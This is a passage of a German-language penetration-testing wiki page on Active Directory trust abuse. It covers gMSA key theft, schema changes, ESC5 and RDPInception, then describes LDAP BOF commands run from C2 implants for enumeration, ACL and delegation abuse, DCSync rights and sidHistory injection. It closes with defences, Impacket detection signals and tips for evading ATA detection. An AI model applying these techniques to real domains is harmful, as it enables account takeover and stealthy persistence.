Ausführliche Informationen finden sich in der Forschung zu [SID Filtering umgehen](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Beliebige gMSA in der Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain ins Visier zu nehmen. Der KDS Root Key, der für die Berechnung der Passwörter von gMSAs benötigt wird, ist in der Configuration NC gespeichert. Mit SYSTEM-Berechtigungen auf einem beliebigen DC kann auf den KDS Root Key zugegriffen werden, um die Passwörter beliebiger gMSAs in der gesamten Forest zu berechnen.

Eine detaillierte Analyse und eine Schritt-für-Schritt-Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender Angriff auf delegierte MSA (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Weitere externe Forschung: [Golden-gMSA-Trust-Angriffe](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Änderungsangriff**

Diese Methode erfordert Geduld, da man auf die Erstellung neuer privilegierter AD-Objekte warten muss. Mit SYSTEM-Berechtigungen kann ein Angreifer das AD Schema so ändern, dass beliebige Benutzer die vollständige Kontrolle über alle Klassen erhalten. Dies kann zu unbefugtem Zugriff auf neu erstellte AD-Objekte und deren Kontrolle führen.

Weitere Informationen finden sich unter [Schema-Änderungs-Trust-Angriffe](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle ermöglicht die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte, um eine Certificate Template zu erstellen, die die Authentifizierung als beliebiger Benutzer innerhalb der Forest ermöglicht. Da sich PKI-Objekte in der Configuration NC befinden, können ESC5-Angriffe ausgeführt werden, wenn ein beschreibbarer Child-DC kompromittiert wurde.

Weitere Informationen dazu finden sich unter [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Wenn keine ADCS vorhanden ist, kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Von Child-Domain-Admins zu Enterprise-Admins eskalieren](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domain – unidirektional (eingehend) oder bidirektional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In diesem Szenario **wird deiner Domain von einer externen Domain vertraut**, wodurch du **nicht näher bestimmte Berechtigungen** für diese Domain erhältst. Du musst herausfinden, **welche Principals deiner Domain welche Zugriffsrechte auf die externe Domain haben**, und anschließend versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domain – unidirektional (ausgehend)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In diesem Szenario gewährt **deine Domäne** einem Principal aus **einer anderen Domäne** bestimmte **Privilegien**.

Wenn jedoch eine Domäne von der vertrauenden Domäne **als vertrauenswürdig eingestuft wird**, erstellt die vertrauenswürdige Domäne einen **Benutzer** mit einem **vorhersehbaren Namen**, dessen **Passwort das Trust-Passwort** ist. Das bedeutet, dass man auf einen Benutzer der vertrauenden Domäne zugreifen kann, um in die vertrauenswürdige Domäne einzudringen, sie zu enumerieren und weitere Privilegienausweitungen zu versuchen:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** des Domain Trusts eingerichtet wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einem Computer zu warten, auf dem sich ein **Benutzer der vertrauenswürdigen Domäne** per **RDP** anmelden kann. Der Angreifer könnte dann Code in den RDP-Sitzungsprozess einschleusen und von dort aus auf die **Ursprungsdomäne des Opfers zugreifen**.\
Wenn das **Opfer außerdem seine Festplatte eingebunden hat**, könnte der Angreifer über den **RDP-Sitzungsprozess** **Backdoors** im **Autostartordner der Festplatte** ablegen. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation von Domain-Trust-Missbrauch

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering gemindert, das standardmäßig für alle Inter-Forest-Trusts aktiviert ist. Dies beruht auf der Annahme, dass Intra-Forest-Trusts sicher sind. Gemäß Microsoft gilt dabei nicht die Domäne, sondern der Forest als Sicherheitsgrenze.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen und wird deshalb gelegentlich deaktiviert.

### **Selective Authentication:**

- Bei Inter-Forest-Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen benötigen Benutzer explizite Berechtigungen, um auf Domänen und Server innerhalb der vertrauenden Domäne oder des vertrauenden Forests zuzugreifen.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-basierten AD-Missbrauch über On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-artige LDAP-Primitiven als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann im Beacon `ldap <subcommand>` auf. Der gesamte Datenverkehr nutzt den aktuellen Logon-Sicherheitskontext über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Zertifikatsvertrauen. Daher sind weder SOCKS-Proxys noch Artefakte auf der Festplatte erforderlich.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurznamen und OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute (einschließlich Security Descriptors) sowie Forest- und Domänenmetadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegationseinstellungen und vorhandene Descriptors für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibrechte) und Vererbung aufzulisten. So lassen sich sofort Ziele für eine ACL-Privilegienausweitung erkennen.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-Schreibprimitive für Privilegienausweitung und Persistenz

- BOFs zur Objekterstellung (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Computerkonten überall dort anzulegen, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` ermöglichen die direkte Übernahme von Zielen, sobald Schreibrechte für Eigenschaften gefunden wurden.
- ACL-orientierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner für beliebige AD-Objekte in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die Gegenstücke `remove-*` bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Toggle) markiert ihn für AS-REP-Roasting, ohne das Passwort anzufassen.
- Delegationsmakros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ändern `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus. Dadurch werden Angriffspfade für constrained/unconstrained/RBCD ermöglicht und Remote PowerShell oder RSAT überflüssig.

### sidHistory-Injektion, OU-Verschiebung und Anpassung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so eine unauffällige Vererbung von Zugriffen vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. So kann ein Angreifer Ressourcen vor der Verwendung von `set-password`, `add-groupmember` oder `add-spn` in den Geltungsbereich delegierter Rechte verschieben. Informationen zu Verschieberechten und Vererbungsprüfungen finden Sie unter [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions).
- Eng umrissene Entfernungsbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Zurücksetzen, nachdem der Operator Zugangsdaten oder Persistenz abgegriffen hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Abwehrmaßnahmen

[**Hier erfahren Sie mehr darüber, wie Sie Zugangsdaten schützen können.**](../stealing-credentials/credentials-protections.md)

### **Abwehrmaßnahmen zum Schutz von Zugangsdaten**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins die Anmeldung nur an Domain Controllern zu erlauben und sie nicht auf anderen Hosts zu verwenden.
- **Berechtigungen für Servicekonten**: Dienste sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte deren Gültigkeitsdauer begrenzt werden. Dies lässt sich folgendermaßen erreichen: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Maßnahmen gegen LDAP-Relay**: Überprüfen Sie die Event-IDs 2889/3074/3075 und erzwingen Sie anschließend LDAP Signing sowie LDAPS Channel Binding auf DCs/Clients, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Erkennung von Impacket-Aktivitäten

Wenn Sie gängige AD-Techniken erkennen möchten, **sollten Sie sich nicht allein auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Dienstnamen, temporäre Batchdateien oder Ausgabepfade verlassen. Erstellen Sie eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suchen Sie dann nach **Implementierungsmerkmalen**, die auch bestehen bleiben, nachdem der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet hat.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Zuverlässigkeit für eigenständige Erkennung** (nach Abgleich mit Ihrer eigenen Baseline):
  - Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
  - DCE/RPC-Authentifizierungspadding mit `0xff`
  - LDAP-Kerberos-Binds, bei denen ein rohes Kerberos-`AP-REQ` direkt im SPNEGO-`mechToken` platziert wird
  - SMB2/3-Negotiate-Anfragen mit wie ASCII aussehenden `ClientGuid`-Werten
  - WMI-`IWbemLevel1Login::NTLMLogin` mit dem nicht standardmäßigen Namespace `//./root/cimv2`
  - Hartcodierte Kerberos-Nonce-Werte
- **Eher als Korrelations- und Bewertungsmerkmale geeignet**:
  - Sparse oder duplizierte Kerberos-ETypelisten, ungewöhnliche/fehlende `PA-DATA` oder eine von nativem Windows abweichende EType-Reihenfolge in TGS-REQ
  - NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit Null-Hostnamen
  - Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC-Verification-Trailer oder SPNEGO-/Kerberos-OID-Abweichungen
  - Mehrere dieser Merkmale desselben Hosts/Benutzers/derselben Sitzung/desselben Zeitfensters sind aussagekräftiger als jedes einzelne schwache Feld
- **Zur Anreicherung, nicht als eigenständige Alerts verwenden**:
  - Standarddateinamen, Ausgabepfade, zufällige Dienstnamen, temporäre Batchdateinamen, Standardnamen für Computerkonten und tool-spezifische HTTP-/WebDAV-/RDP-/MSSQL-Zeichenfolgen
  - Diese lassen sich leicht ändern und eignen sich am besten dazu, zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Betriebshinweise**:
  - Für einige dieser Signale sind entschlüsselter Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Sichtbarkeit auf der Dienstseite erforderlich
  - Prüfen Sie die Ergebnisse anhand von Samba-/Linux-Clients, Appliances und älterer Software, bevor Sie Alerts auslösen
  - Entwickeln Sie Erkennungen schrittweise von Anreicherung über Hunting bis hin zu Alerts, während Sie mehr Vertrauen in die Baseline gewinnen

### **Implementierung von Deception-Techniken**

- Bei Deception werden Fallen gestellt, etwa Decoy-Benutzer oder -Computer mit Eigenschaften wie nicht ablaufenden Passwörtern oder der Kennzeichnung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit bestimmten Rechten oder deren Aufnahme in Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zum Einrichten von Deception-Techniken finden Sie unter [Deploy-Deception auf GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennen von Deception**

- **Bei Benutzerobjekten**: Verdächtige Indikatoren sind ein untypischer ObjectSID, seltene Anmeldungen, ungewöhnliche Erstellungsdaten und eine geringe Anzahl fehlerhafter Passworteingaben.
- **Allgemeine Indikatoren**: Ein Vergleich der Attribute potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können dabei helfen, solche Täuschungen zu erkennen.

### **Umgehen von Erkennungssystemen**

- **Umgehung der Microsoft-ATA-Erkennung**:
  - **Benutzeraufzählung**: Vermeiden Sie die Aufzählung von Sitzungen auf Domain Controllern, um eine Erkennung durch ATA zu verhindern.
  - **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticket-Erstellung hilft, die Erkennung zu umgehen, da kein Downgrade auf NTLM erfolgt.
  - **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um eine Erkennung durch ATA zu vermeiden, da die direkte Ausführung auf einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts zur Täuschung in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit für die Ausnutzung von Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wordlist verwenden](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket im Detail](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Konten über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Änderungen an Netlogon-Sicherheitskanalverbindungen im Zusammenhang mit CVE-2020-1472 verwalten](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise zu vergessenen Null Sessions und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 4) – Forschung zur Umgehung der SID-Filterung](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 5) – Golden-GMSA-Trust-Angriff – vom Child zur Parent-Domäne](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 6) – Schema-Change-Trust-Angriff – vom Child zur Parent-Domäne](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Admins einer Child-Domäne zu Enterprise Admins aufsteigen, indem AD CS missbraucht wird – ein Follow-up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: Active-Directory-DACL-Backdoors entwerfen](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Quellcode des NetExec-pre2k-Moduls](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema – Attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
